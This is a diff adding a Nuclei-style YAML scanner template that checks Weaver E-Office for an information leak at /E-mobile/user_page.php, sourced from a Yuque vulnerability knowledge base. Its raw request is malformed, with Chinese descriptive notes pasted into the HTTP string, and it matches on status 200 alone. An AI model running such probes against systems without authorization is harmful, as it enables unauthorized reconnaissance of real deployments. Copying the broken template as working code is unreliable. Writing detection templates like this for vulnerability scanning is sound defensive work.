@@ -1,0 +1,34 @@
+id: poc-ign35wkug0kqv9go
+info:
+  name: 泛微E-Office user_page.php信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ign35wkug0kqv9go'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ign35wkug0kqv9go
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /E-mobile/user_page.php HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
